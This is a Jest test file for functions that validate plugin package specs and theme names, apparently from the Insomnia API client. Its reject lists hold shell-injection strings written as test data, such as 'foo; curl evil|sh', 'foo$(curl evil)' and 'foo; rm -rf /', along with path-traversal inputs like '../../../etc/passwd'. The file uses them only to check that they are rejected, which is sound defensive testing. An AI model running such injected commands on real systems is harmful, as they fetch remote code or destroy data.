import { describe, expect, it } from '@jest/globals';

import {
  assertValidPackageSpec,
  assertValidThemeName,
  isValidPackageSpec,
  isValidThemeName,
} from '../validate-package-spec';

describe('isValidPackageSpec', () => {
  it.each([
    'lodash',
    '@scope/foo',
    'insomnia-plugin-themes',
    'foo@1.2.3',
    'foo@^1.2.3',
    '@scope/foo@~1.0.0',
    'lodash@1.0.0 || 2.0.0',
    'a-b_c.d',
  ])('allows legit spec %p', spec => {
    expect(isValidPackageSpec(spec)).toBe(true);
  });

  it.each([
    // Shell-metacharacter injection (the actual security issue this guards):
    'foo; curl evil|sh',
    'foo&&touch /tmp/pwn',
    'foo`evil`',
    'foo$(curl evil)',
    'foo${IFS}rm',
    'foo|sh',
    'foo>out',
    'foo bar',
    'foo\nbar',
    // Path traversal into tmpDir join:
    '../../../etc/passwd',
    '/etc/passwd',
    '.hidden',
    '_private',
    '@scope/../escape',
    // Empty / too long:
    '',
    'a'.repeat(300),
  ])('rejects malicious / malformed spec %p', spec => {
    expect(isValidPackageSpec(spec)).toBe(false);
  });

  it('rejects non-string input', () => {
    expect(isValidPackageSpec(undefined as unknown as string)).toBe(false);
    expect(isValidPackageSpec(null as unknown as string)).toBe(false);
    expect(isValidPackageSpec(42 as unknown as string)).toBe(false);
  });
});

describe('assertValidPackageSpec', () => {
  it('throws on malicious input', () => {
    expect(() => assertValidPackageSpec('foo; rm -rf /')).toThrow(/Invalid plugin package name/);
  });

  it('returns void on valid input', () => {
    expect(() => assertValidPackageSpec('lodash')).not.toThrow();
  });
});

describe('isValidThemeName', () => {
  it.each([
    'one-dark',
    'midnight',
    'theme1',
    'a.b_c-d',
  ])('allows legit theme name %p', name => {
    expect(isValidThemeName(name)).toBe(true);
  });

  it.each([
    // Path traversal - the actual security issue this guards against:
    '../../../tmp/evil',
    '../../etc',
    '/etc/passwd',
    'foo/bar',
    'foo\\bar',
    '.hidden',
    '_private',
    // Shell metachars / spaces / control chars (defense in depth):
    'foo;evil',
    'foo bar',
    'foo\nbar',
    'foo`evil`',
    'foo$(evil)',
    // Empty / too long:
    '',
    'a'.repeat(70),
  ])('rejects malicious / malformed theme name %p', name => {
    expect(isValidThemeName(name)).toBe(false);
  });

  it('rejects non-string input', () => {
    expect(isValidThemeName(undefined as unknown as string)).toBe(false);
    expect(isValidThemeName({ toString: () => 'evil' } as unknown as string)).toBe(false);
  });
});

describe('assertValidThemeName', () => {
  it('throws on path-traversal input', () => {
    expect(() => assertValidThemeName('../../../tmp/evil')).toThrow(/Invalid theme name/);
  });

  it('returns void on valid input', () => {
    expect(() => assertValidThemeName('one-dark')).not.toThrow();
  });
});
